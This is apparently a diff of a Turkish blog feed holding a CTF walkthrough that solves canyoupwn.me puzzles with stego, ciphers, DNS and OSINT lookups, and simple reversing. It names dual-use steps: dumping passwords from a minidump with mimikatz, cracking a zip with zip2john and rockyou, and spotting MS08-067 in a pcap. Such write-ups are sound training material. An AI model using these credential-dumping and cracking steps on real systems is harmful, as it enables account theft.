-&lt;a href=&quot;https://4.bp.blogspot.com/-q3t84rMrLPk/WS4QX_2qTQI/AAAAAAAAAoI/aenHsBvJHpYVgO4tT3nFHpCqwNIf7pKAwCLcB/s1600/Screenshot_5.png&quot; imageanchor=&quot;1&quot; style=&quot;margin-left: 1em; margin-right: 1em;&quot;&gt;&lt;img border=&quot;0&quot; data-original-height=&quot;630&quot; data-original-width=&quot;533&quot; height=&quot;320&quot; src=&quot;https://4.bp.blogspot.com/-q3t84rMrLPk/WS4QX_2qTQI/AAAAAAAAAoI/aenHsBvJHpYVgO4tT3nFHpCqwNIf7pKAwCLcB/s320/Screenshot_5.png&quot; width=&quot;270&quot; /&gt;&lt;/a&gt;&lt;/div&gt;
-&lt;p&gt;&lt;br /&gt;
-&lt;br /&gt;
-Yukarıdaki sorumuz gibi bunuda online bir “Ook! to text” sitesini kullanarak çözebiliyoruz.&lt;br /&gt;
-&lt;br /&gt;
-28.Sorumuz’un cevabı : cypwn_{platon}&lt;br /&gt;
-&lt;br /&gt;&lt;/p&gt;
-&lt;div class=&quot;separator&quot; style=&quot;clear: both; text-align: center;&quot;&gt;
-&lt;a href=&quot;https://3.bp.blogspot.com/-9xfPKRxAXU0/WS4QxD3uLNI/AAAAAAAAAoM/eJzxh1IVZVstX70qvr9jOrwI0etftHS3wCLcB/s1600/Screenshot_6.png&quot; imageanchor=&quot;1&quot; style=&quot;margin-left: 1em; margin-right: 1em;&quot;&gt;&lt;img border=&quot;0&quot; data-original-height=&quot;523&quot; data-original-width=&quot;508&quot; height=&quot;320&quot; src=&quot;https://3.bp.blogspot.com/-9xfPKRxAXU0/WS4QxD3uLNI/AAAAAAAAAoM/eJzxh1IVZVstX70qvr9jOrwI0etftHS3wCLcB/s320/Screenshot_6.png&quot; width=&quot;310&quot; /&gt;&lt;/a&gt;&lt;/div&gt;
-&lt;p&gt;&lt;br /&gt;
-&lt;br /&gt;&lt;/p&gt;
-
-&lt;p&gt;29.Sorumuz’a geçelim : Is This Love ?&lt;/p&gt;
-
-&lt;p&gt;Sorumuz’da bize bir rar dosyası veriliyor “love” parolası ile içini açtığımızda içinden bir rar dosyası daha çıkıyor ve onun içindende altta gördüğünüz dosyalar.&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;http://i.imgur.com/IqEHqlD.jpg&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;Rar’ımızın içinden çıkan resim dosyalarına ne kadar “steg” vs.. denesekde sonucu bulamadık.Sonunda bir gimp ile el atmaya karar verdik.&lt;/p&gt;
-
-&lt;p&gt;Biraz oynayınca içinden 2 adet “QR Code” Çıkardık.QR’ları online bir decoder ile çözdüğümüzde çıkan sonuçlar bunlar oldu :&lt;/p&gt;
-
-&lt;p&gt;ctf , ypbitrghkrpsgkxehr&lt;/p&gt;
-
-&lt;p&gt;2sinide flag’e denedik ama hiçbir sonuç elde edemedik.&lt;/p&gt;
-
-&lt;p&gt;Sonunda aklıma “ypbitrghkrpsgkxehr” vigenere bir cipher olabileceği geldi online bir vigenere decoder ile çözmeye çalıştık anahtarımız’ında ctf “string”i olduğunu bulunca cevap’a ulaştık. :&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;http://i.imgur.com/R7ydx1T.jpg&quot; alt=&quot;&quot; width=&quot;450&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;29.Sorumuz’un cevabı : cypwn_{wwwgameofpwnerscom}&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;http://i.imgur.com/PjudIuf.jpg&quot; alt=&quot;&quot; width=&quot;450&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;30.Sorumuz’a geçelim :  Not deleted, Can not be deleted!!!&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;http://i.imgur.com/vhzlaDb.jpg&quot; alt=&quot;&quot; width=&quot;450&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;Bu sorumuz aslında ctf mantığını ortaya koymuş xD&lt;/p&gt;
-
-&lt;p&gt;Verilen github repository’sine gittiğimizde :&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;http://i.imgur.com/UtgmoeJ.jpg&quot; alt=&quot;&quot; width=&quot;1000&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;Readme kısmında arkadaşlar ipucu vermiş gibi görünüyor birazcık.&lt;/p&gt;
-
-&lt;p&gt;Repository üzerinde yapılan değişikliklere baktığımız’da “secrets.yml” isimli bir dosya geliyor karşımıza tabi 5,6 dosya daha inceledim ben sonunda farkettim bunu.&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;http://i.imgur.com/bKUlj4J.jpg&quot; alt=&quot;&quot; width=&quot;800&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;Silinen ve güncelleştirilen iki secret dosyamızdada flag görünüyordu.&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;http://i.imgur.com/txNAD1O.jpg&quot; alt=&quot;&quot; width=&quot;700&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;30.Sorumuz’un cevabı : cypwn_{dikkat_etmek_ve_detayli_incelemek_butun_hersey_bu}&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;http://i.imgur.com/IRXeK02.jpg&quot; alt=&quot;&quot; width=&quot;450&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;31.Sorumuz’a geçelim : Mr.Robot&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;http://i.imgur.com/dvrWwGf.jpg&quot; alt=&quot;&quot; width=&quot;450&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;Sorumuz’dan bir adet html dosyası çıkıyor.Dosyayı açtığımızda çok garip birşey çıkıyor dosyaya türlü şeyi denettirdi bana o mr robot ismi ama sonunda tüm dizileri replace ederek cevabı buldum :&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;http://i.imgur.com/wxXrfxh.jpg&quot; alt=&quot;&quot; width=&quot;450&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;31.Sorumuz’un cevabı : cypwn_{matrixhacker}&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;http://i.imgur.com/7RCEcPg.jpg&quot; alt=&quot;&quot; width=&quot;450&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;32.Sorumuz’a geçelim : (D)emand (B)rogress&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;http://i.imgur.com/TtwSqPe.jpg&quot; alt=&quot;&quot; width=&quot;450&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;Bu soru en zor sorulardan bir tanesiydi firefox, bing, google gezdim gezdim anam gezdim sonunda yazı ile benzerlik taşıyan “pacer veritabanı leak”ına denk geldim flag olarak pacer’i denediğimde soruyu geçecektim.&lt;/p&gt;
-
-&lt;p&gt;32.Sorumuz’un cevabı : cypwn_{pacer}&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;http://i.imgur.com/nJNfkga.jpg&quot; alt=&quot;&quot; width=&quot;450&quot; /&gt;&lt;/p&gt;</content><author><name></name></author><summary type="html">Merhaba arkadaşlar yine 3,4 hafta MR. ROBOT walktrough’tan sonra hiç birşey yazmadım onun telafisi ve google botlarına ayıp olmasın diye ctf.canyoupwn.me’nin hazırladığı çözdüğüm tüm ctf sorularının nasıl çözüldüğünü anlatan bir blog olacak bu. Şuan 8.’yim ctf leader board’ında. Toplam’da 58 soru çözdüm diğer soruları çözersem eklemeye devam edeceğim. ilk olarak bize 10 puan veren ve flaglerin nasıl yazılacağını gösteren bir forum var. Soruların çözümüne geçmeden önce canyoupwn.me ekibinin eline sağlık böyle güzel bir capture the flag projesini bize sundukları için.Bazı sorular bizi dertlendirdi(Gerçek anlamda kayahan şarkısı felan :D) bazı sorularda eğlendirdi şarkılarıyla.Çok güzel bir yarışma olmuş.Grafikleri ayrıca beğendim. Şimdi sorularımıza geçme zamanı Alttan üste doğru tüm çözümleri anlatmayı planlıyorum. Başlayalım. İlk sorumuz : There is not exist easier than this Bize bir google drive linki vermiş ekibimiz ben başta bir çok şekil şukul denesemde sonunda kendimi paintte resim dosyası ile parlaklık ayarlarını yaparken buldum parlaklığı en az’a çekip kontrastları yüksek yapınca flag gözüküyordu. 1.sorumuz’un cevabı : cypwn_{cok_gizli} 2.sorumuza geçelim : Ava Giden Avlanır Sorumuz bize bir analiz.rar dosyası veriyor. unrar aracılığıyla dosyanın içini açtığımızda karşımıza “skype stelaeri” diye bir dosya çıkıyor bu dosyayı strings ile incelediğimde ise bir kaç flage benzeyen yazı buldum tek tek hepsini deneyince. 2.sorumuz’un cevabını : cypwn_{capkin_hacker} olarak buluyoruz 3.sorumuza geçelim : Bir türüjan yazmışım moruk Bu sorumuzda ekibimiz bize bir “server.rar” dosyası veriyor indirmeye çalıştığımızda ise “chrome” arkadaşımız bize bas bas zararlı bu dosya diye bağırıyor zaten sorumuzun adındanda anlamıştık ne olduğunu :D Bu dosyaya online “sandbox” yolu göründü baştan.İndirip “unrar” ile açtığımızda karşımıza “server.exe” isimli bir dosya geliyor.Bu dosyası “file” komutu ile incelediğimize “PE32 executable” dosya olduğunu söylüyor.Bunu hemen vazgeçilmezimiz “virustotal.com”a atıyoruz ve inceliyoruz.İncelerken bu dosyanın daha önceden tarandığını ve bakabileceğimizi söylüyor. Daha önceden taranan “server.exe” dosyamızın ne olduğuna bakmaya çalışırken yorumlarada kaydı gözüm ve flagimiz oradaydı. 3.Sorumuz’un cevabı : cypwn_{capkinhacker.zapto.org} 4.Sorumuza geçelim : TV? Bu soruda baya kafa yordum ben.Sebebini az sonra öğrenicez zaten :D Öncelikle sorumuz : Hacı geçen canyoupwnme diye bir kanal gördüm onion pi den bahsediyordu, “bin”li bişeler vardı sanki.. Sorudan dolayı ben hemen “canyoupwn.me” sitesine gittim ve arama bölümüne onion yazdım.Soruda “onion pi ile ilgili bahsediyordu” diyince ilk aklıma sitelerinde aramak geldi. Yazıyı baya inceledik’ten sonra sayfanın en altında değişik bir yazı gördüm ilk önce bunun “hash” olabileceğini düşündüm ama değildi. Pastebin ile arkadaş grubumuzda birşeyler paylaşırken pastebin urlsinin son yazıları çok tanıdık geldi. TV? sorusunu tam bırakacakken bu pastebin urlsi yüzünden geri döndüm “onion pi kurulum” yazısına ve o yazıyı pastebinin yanina pastebin.com/xvtMaBkU olarak yerleştirdim ve flag karşımdaydı.Yazıda çok kolaymış gibi görünüyor ama belkide o pastebini o grupta paylaşmasam bu soruyu çözemeyip yerlerde sürünecektim :D şans işte. 4.Sorumuz’un cevabı : cypwn_{h4ckm3} 5.Sorumuz’a geçelim : This is Anonymous job! Bu soruda merak sınırlarımı iyicebi zorladım hiç bitmeyen merakımı. 5,6 kişi hariç bu soruyu çözen hiç kimse yok leaderboard’ta. İpucu : Selwyn Jamison`ın şirketi saldırıya uğramış parolalar leak olmuş.. Baya bir uğraştım bu soru için sonunda Sorunun başlığını görünce google’de şöyle bir araştırma sergiledim. Bu soruda cidden terledim 1 saat ne yemek yedim ne birşey birde şişman adamım ben kalamıyorum öyle :D. Tam bayılıcam derken oradaki hashlere rastladım ve hash-identifier’e attım ama hiçbirşey çıkaramadım.Sonunda aceba hash’lardan birimi lan cevap dayanç ? diye sordum kendime ve yolumu ilk işaretlediğim hash ile buldum :D. 5.Sorumuz’un cevabı : cypwn_{2dad125c0c244a8cad69951515ecdeb75b0b1daa} 6.Sorumuz’a geçelim : Social Media Bu soruda gerçek bir stalker olduğum kanısına vardım :D İlk aracımız tabiki google oldu ismi googlede araştırdığımızda ilk 3 linkte garip geliyor.Hepsini ben tek tek inceledim. 2.ve 3. linkte bir “QR CODE” vardı.Yeni sekmede resim’i açıp online bir “QR CODE DECODER” ile flagimizi bulmuş olduk. Adımları ve hangi online decoder sitesini kullandığımı tek tek fotoraflar’dan görebilirsiniz. 6.Sorumuz’un cevabı : cypwn_{Are_you_a_hacker_?} 7.Sorumuz’a geçelim : Nerd İpucu’muz : I need a source code for a domain. But I don’t know what is the domain name! search “ canyoupwn.me “ Bu soruya anlam veremedim ben ve yine google’ye sarıldım. İpucumuz’da “canyoupwn.me” domainimiz için kaynak kodu aramamız gerekiyor.İpucumuzdaki keywordleri birleştirerek bir google araştırması sergiledim ve 1. URL’mizin açıklamasında source code arayabileceğimiz yazıyordu. Siteye girdiğimizde bizi böyle bir ekran karşıladı. Hemen arama bölümüne “canyoupwn.me” yazdım ve bu seferde farklı bir domain çıktı başlık olarak. Aceba flag’imiz bu domain olabilirmi diye bir deneme yaptıııııık yapış o yapış. 7.Sorumuz’un cevabı : cypwn_{erdemoflaz.com} 8.Sorumuz’a geçelim : Secret İpucumuz : secret.canyoupwn.me İpucunda verilen web siteye girdiğimizde hiçbir türlü cevap gelmiyor server’den.Dns adresi bulunamadı diyor.Bizde hemen bir “DNS KAYIT” lookup’u yapıyoruz. Ve işte flag karşımızda. 8.Sorumuz’un cevabı : cypwn_{kks271723jjjasd9asd771239} 9.Sorumuz’a geçelim : xCyberx İpucumuz uzun olduğu için buraya yazmıyorum resimden bakabilirsiniz. Bu soruda biraz zorlandım bir kaç pdf okumak zorunda bile kaldım :D sonunda bir ctf’te uygulanan “steghide” tekniğine baktım uzun araştırmalar sonucu. ctf’te resim dosyasının içinden dosya çıkartabiliyorlardı ama bizim dosyamızda biraz farklı oldu çıkarttığımız dosya bizden bir şifre istedi. Şifre olarak soru başlığımız olabileceğini düşündüm ve “xcyberx” olarak girdim şifreyi ama başarısız oldum.Farklı kombinasyonlar denerken “xcyberx” ile ilgili şifrenin “cyberx” olduğunu buldum ve resim dosyamızı “steghide” ile açtıktan sonra içinden “hint.txt” diye bir dosya çıktı ve onun içindende bir “yandex dosya” url’si çıktı. Bu urlye gittiğimizde içinden bir “QR CODE” gördük ve yine decoder’imize sarıldık. Bu “QR CODE”u decode ettiğimizde karşımıza böyle birşey geldi. İşaretlediğim yerlerdeki hashlere baktığınızda base64 olduğunu görebilirsiniz bunu base64decoder ile decode ettiğimizde.Karşımıza böyle bir hash geliyor. Bunun bir “ROT” olduğunu kolaylıkla anladık tabi hemen “ROT DECODER”imize sarılıp.Karşımıza bu karmaşık yazıları dizdik. Değerler flag’e benzediği için bizim flag başlangıç türümüzü “CTRL + F” ile aradım “cypwn_{}”. Ve flagimizi bu şekilde bulduk. 9.Sorumuz’un cevabı : cypwn_{g00d_j0B_Br0y0u@r3_@_h@ck3R} 10.Sorumuz’a geçelim : Mail İpucu : Bu canyoupwn.me mailleri nerede barındırıyor acaba? Bu soruyu görünce aklımıza “dig” gelmiyor değil online bir web sitedende yapabiliriz ama biz “dig” ile ilerleyelim. “dig” ile mx taraması yaptığımız’da mail server olarak karşımıza “mx.yandex.net” çıkıyor.Bu olabilirmi diye deniyoruz cevabımızı ve bu soruyuda böylelikle geçmiş oluyoruz. 10.Sorumuz’un cevabı : cypwn_{mx.yandex.net} 11.Sorumuz’a geçelim : NS İpucu : canyoupwn.me ‘nin nameserverlarından birisi? İpucumuz açık açık belirtti ne istediğini bizede online veya toollardan birini kullanarak çıkan nameserverleri denemek düşüyor. Online herhangi bir nameserver checker’den bu işlemi yapınca 2 tane “cloudflare” nameserver’i geliyor 1.’si flagimizin cevabı çıktı. 11.Sorumuz’un cevabı : cypwn_{ada.ns.cloudflare.com} 12.Sorumuz’a geçelim : Cyrpto Die İpucumu : Rardaki dosyayı açarak dosyayı incelememize yardımcı olmalısın. Bu soru biraz değişik geçti benim için. Sorumuz’un açıklamasında verilen link’ten bir “ctf_canyoupwnme.rar” dosyası indiriyoruz. bu dosya’yı açtığımız’da içinden “canyoupwnme.rar” ve bir “password.txt” dosyası çıkıyordu. Hash’imiz “MD5” çıkıyor online bir “MD5 Decrypter” ile bu hash’i çözdüğümüzde karşımıza “eHh4eHh4” isimli bir yazı geliyor. Bu çıkan sonuçtaki yazı base64 çıkıyor ve bu base64 hash’ini online bir web sitede decode ettiğimizde karşımıza “xxxxxx” isimli bir yazı geliyor. Aceba bu “password.txt”den önce gelen rar’ın şifresi olabilirmi diye bir deniyoruz. Veee flag karşımızda. 12.Sorumuz’un cevabı : cypwn_{ctf_akiyo_mansallah} 13.Sorumuz’a geçelim : Memory Dump İpucumuz : Ram Imajından flag ı çıkart. Sorun’un ipucundanda bize gelen “rar” dosyasının bir ram imajı olduğunu açık açık belirtiyor herhangi bir ram imaj analizi yapan bir tool ile bu işi kolayca halledebiliriz.Ben “volatility” kullanıyorum bunu çözmek için. Unrar ile rar dosyamızın içinden çıkardığımız “canyoupwnme.mem” dosyasını resimde gördüğünüz parametreler ile açtığımızda karşımıza “FLG : Y3lwd25fe21lbW9fZmxhZ19idWx1bmR1fQ==” isimli base64lü bir hash geliyor.Online bir web sitede decode ettiğimizde flage ulaşıyoruz. 13.Sorumuz’un cevabı : cypwn_{memo_flag_bulundu} 14.Sorumuz’a geçelim : L-P İpucumuz : Parolayı bul Bu soru benim için biraz karmaşık oldu.Öncelikle verilen “rar” linkinden dosyamızı indiriyoruz. Herzamanki gibi “unrar e findpassword.rar” yazarak dosyamızı açıyoruz. İndirdikten sonra “file” komutumuz ile dosyamızın ne olduğunu inceliyoruz ve bize “MİNİDUMP Crash Report Data” olduğunu söylüyor.Daha önceden “mimikatz” kullanan varsa aranızda anlamıştır olayı zaten :D Windows için “mimikatz” indirmek için : https://github.com/gentilkiwi/mimikatz/releases/tag/2.1.1-20170508 “findpassword” dosyamızı mimikatz’ın içine atıyoruz. Attıktan sonra mimikatz’ı çalıştırıp “findpassword” dosyamızı seçip tüm password’leri dump etmesini şu parametreler ile sağlıyoruz : “findpassword MİNİ DUMP” dosyamızın içindeki “login passwordleri” çıkardığımızda ahmet gürel kullanıcısı için bir çok password türü çıkıyor deneyip yanıldıktan sonra asıl “flag” cevabımızın ahmet gürel kullanıcısının şifresi olan “canyoupwnmectf” olduğunu buluyoruz. 14.Sorumuz’un cevabı : cypwn_{canyoupwnmectf} 15.Sorumuz’a geçelim : Attack Type İpucumuz : Pcap dosyasında bir saldırı gerçekleşmektedir.Hangi zafiyet exploit edilmeye çalışılmıştır? İndirdiğimiz “rar” dosyasından bir adet .pcap dosyası çıktı ve gözümüz wireshark’a kaydı başlayalım incelemeye. Çoğu paket’ten smb portları gözüktü microsoft-ds portları gözüktü azıcık bir gözümüz açıldı. Ama wireshark ile birşey bulamadık biz birde “NetworkMiner” aracı ile göz atalım ama bir sorunumuz var “NetworkMiner” sadece .pcap dosyalarını kabul ediyor bize gelen dosya .pcapng bunu .pcap yapmamız gerek yada para verip”NetworkMiner”in sürümünü yükseltmemiz gerek. http://pcapng.com/ ile pcapng dosyamızı .pcap’e çevirdik ve network miner ile dosyamızı açtık. Sorumuzu kavradığımız için bizden zaafiyet tipini istiyor. netbios-ssn için vuln sürümlerine bakıp deneyip yanıldığımızda.Bunun MS08-067 olduğunu buluyoruz. 15.Sorumuz’un cevabı : cypwn_{MS08-067} 16.Sorumuz’a geçelim : Imaj Tools İpucumuz : Ram Imajı alınırken hangi araç kullanıldığını bulmamıza yardım et ! Bu soruda biraz arada kaldım çünkü “volatility” olabilirdi cevabı ama sonradan ram imaj almak için kullanılan toolları incelerken “RamCapture”ye denk geldim ve cevapta tahmin ettiğim gibi çıktı. 16.Sorumuz’un cevabı : cypwn_{RamCapture} 17.Sorumuz’a geçelim : Change is good Bu soruda ipucumuz yok.Herşeyi devletten beklememek lazım :D Bu soruda baya bir uğraştım son pes edecekken hex ile bakayım dedim ve yolumu oradan çizip bu soruyu çözdüm. öncelikle linux’ta default olarak gelen “hexdump”u kullanıp dosyayı açtım. Garip bir şekilde dosyamızın headerleri yok’tu yani dosyanın ne olduğu belirtilmemişti. http://www.garykessler.net/library/file_sigs.html Bu siteyi kullanarak dosya headerlerine ulaştım ama dosyaya hangi headeri vereceğimi bilmiyordum. “strings” komutu ile dosyayı baya bir inceledikten sonra dosyanın içinde pdf yazılarının geçtiğini gördüm. Hemen sitemizden “PDF” headerlerini alıp dosyayı yeniden düzenliyecektik. Hex editörümüz ile dosyayı açıp işlemlere başladık. PDF Header intleri : 25 50 44 46 Nopların yerine “00 00 00 00” PDF headerlerimizi koyacaktık. Dosyamızı pdf olarak editledik’ten sonra açınca karşımıza böyle bir yazı çıktı : Sorumuzun cevabını “interesting” olarak girince sonuca ulaşmış olduk. 17.Sorumuz’un cevabı : cypwn_{interesting} 18.Sorumuz’a geçelim : Miyav Bu sorumuzda bizi şirin bir kedi karşılıyor. Kedimizi “file” komutu ile bir inceliyoruz. Kedimizin .jpg değilde .jpeg olduğunu söylüyor komutumuz bize değiştirip baktığımızda herhangi bir flag türü birşey göremiyoruz aklımız ne kadar “steganography”ye kaysada arkada başka birşeyler var diyip “binwalk” toolumuzu kullanıyoruz. “binwalk”ın yanında kullandığım -e parametresi “extract” anlamına geliyor. Şirin kedimizin içinden 1 adet “zip” dosyası 2 adette “ASCII” yani text dosyası çıkardık. “ASCII” dosyalarımızı açtığımızda içinden “ameno” yazan bir yazı çıkıyor. Sorumuza cevap olarak bunu denediğimizde flag answerimizi buluyoruz. 18.Sorumuz’un cevabı : cypwn_{ameno} 19.Sorumuz’a geçelim : Attack IP İpucumuz : pcap dosyasında bir saldırı gerçekleşmektedir.Saldırganın IP sini bulmamıza yardım etmelisin. İpucumuz’dan anladığınız gibi bir pcap dosyasını analiz edip flag değerine saldırganın ip’sini vermemiz gerek. İndirdiğimiz atak.pcap dosyasını incelediğimizde : Request’i gönderen ip’nin ve alan ip’nin değiştiğini ama genelde aynı olduğunu görebiliyoruz. Elimizde 4 ip var ve içlerinden biri bizim flag answerimiz çıkacak deniyip gördüğümüzde, cevabımızın “192.168.237.128” local ip’si olduğunu görebiliyoruz. 19.Sorumuz’un cevabı : cypwn_{192.168.237.128} 20.Sorumuz’a geçelim : Is Empty? İpucumuz : Daha dün baktım burdaydı ama şimdi bulamıyorum? Bu sorumuz’da zip dosyamızı hash’e çevirmemiz gerekiyor bunun için arkadaşlar çok güzel bir makale hazırlamış incelemek isterseniz ingilizcesi olana güzel :/ : https://blog.sleeplessbeastie.eu/2015/05/25/how-to-crack-archive-password-faster/ Öncelikle zip dosyamızı “zip2john” ile hash’e çeviriyoruz : Sonra hash dosyamızı “rockyou.txt” wordlist’i ile şifresini çözmek için döngüye sokuyoruz ve bulduğumuz şifreyi okuyoruz : Şifremiz : 12345 çıktı :P Dosyamızı açtıktan sonra incelemeye başlıyoruz flag bulabilecekmiyiz diye. uzun bir süreden sonra(25 dk xD) bir github linkine denk geliyoruz. “.git/” dizinin içindeki “config” dosyasında. github linkine gittiğimizde bizi “relevant” isimli bir dosya bekliyor. İçine girdiğimizde ise bizi flagimiz bekliyor. :) 20.Sorumuz’un cevabı : cypwn_{easy_peasy_lemon_squeezy} 21.Sorumuz’a geçelim : Flog İpucumuz : Flag’ı bul Bize bir rar dosyası ve içinde “canyoupwnme.log” dosyası veriyor. “canyoupwnme.log” dosyasının içini biraz gezdikten sonra sıkılıp flag değerimizin başı olan “cypwn_{“i aradım ben dosya içinde ve flag’imiz karşımızdaydı : 21.Sorumuz’un cevabı : cypwn_{canyoupwnme_log} 22.Sorumuz’a geçelim : Rev1 Sevdiğim “reverse” sorularına geçtik :D Bu soruda ne kadar derinlere insemde sonum “strings” komutu ile bitti. Program içindeki stringleri incelediğimizde parola için kullanılan “BATLAMYUS” cevabını görebiliyoruz. Sorumuz’un cevabı : cypwn_{BATLAMYUS} 23.Sorumuz’a geçelim : Rev2 Bize bir “ELF-32 bit” dosyası veriyor. dosyaya yetkiyi verip açtığımızda bir pincode istiyor bizden. “GDB” debugger’i aracılığıyla bu dosyayı debug ettiğimizde girdiğimiz pinkodumuz’un doğru pinkodumuz ile “cmp” komutu vasıtasıyla karşılaştırıldığını görebiliyoruz. İlerideki yazımda belki “debugger” ve “assembly” olayını biraz daha açabilirim diye düşünüyorum. Çıkan “hexadecimal” değerimiz yani doğru pinkodumuz’u ASCII(text)’e online bir servis aracılığıyla çevirelim. Doğru pinkodum’uz “1423”ü “ELF” dosyamıza deniyelim. 23.Sorumuz’un cevabı : cypwn_{1423} 24.Sorumuz’a geçelim : Rev3 Bu sorumuz’da yukarıdaki gibi aynı mantıkta.Bizden bir pinkod istiyor. Değerimizi online bir “hexadecimal to ascii” servisi ile çözdüğümüzde değerimiz “3454” çıkıyor. 24.Sorumuz’un cevabı : cypwn_{3454} 25.Sorumuz’a geçelim : Yeşil Erik İpucumuz : Yeşil eriğin tadı da bir başkadır :) \n bubirsecret Evet arkadaşlar 400 Puanlık uzmanlık sorusu karşınızzdaaa. İnanın ne kadar zor bir soru olarak gelsede size çok kolay. Alt satır’da verilen “bubirsecret” yazısını google’de “intext:bubirsecret” olarak aratınca ilk url’den olayı çözmüş oluyorsunuz tam olarak sayılmasada. intext google’de text aramak için bir method’dur. İlk url’miz olan ekşisözlük forum’una girdiğimiz’de bizi böyle bir sayfa karşılıyor : Buradaki cipher’in “vigenere” olduğunu az çok anlayan olmuştur fakat yanındaki “sır” ne diyecek olursanız bizim anahtarımız.Yanlış duymadınız gerçekten anahtarımız :D cipher’imiz olarak bulduğumuz articlede’ki “vcpkmjauzczzhbfdwaa”yı kullandığımızda ve anahtar’a “Bakınız : sır” köşesindeki sır’ı yazdığımızda flag’imizi bulmuş oluyoruz. Sorumuz’un cevabı : cypwn_{duysesimikriptoloji} 26.Sorumuz’a geçelim : This is LEAK! Bu soru cidden çok alakasızdı fotoraf ile. Soru’nun cevabı şansımın yaver gitmesi oldu. Canyoupwn.me sitesini gezinirken “WebRTC IP Leak” isimli bir post’a denk geldim. Cevap olarak konu başlığındaki herşeyi denedim “WebRTC_IP_Leak” olsun “IP” olsun.Sonunda sorunun cevabını “webrtc” olarak buldum. 26.Sorumuz’un cevabı : cypwn_{webrtc} 27.Sorumuz’a geçelim : Sen Görürsün Sevgilim Soru’da verilen yazının açıkca “BrainFuck” olduğu görünebiliyordu online bir brainfuck to text sitesinde sorumuz’un cevabını bulduk. 27.Sorumuz’un cevabı : cypwn_{sokrates} 28.Sorumuz’a geçelim : Sevgilimden Trip Yedim Ne Diyo bu ya? Yukarıdaki sorumuz gibi bunuda online bir “Ook! to text” sitesini kullanarak çözebiliyoruz. 28.Sorumuz’un cevabı : cypwn_{platon}</summary></entry></feed>
+&lt;p&gt;Google botlarına teşekkürler iyi günler :)&lt;/p&gt;</content><author><name></name></author><summary type="html">Bu yazı içerisindeki fotoraflar imgur.com sitesine yüklüdür ve bu site türkiyede engellidir fotorafları görmek için proxy kullanınız !</summary></entry></feed>
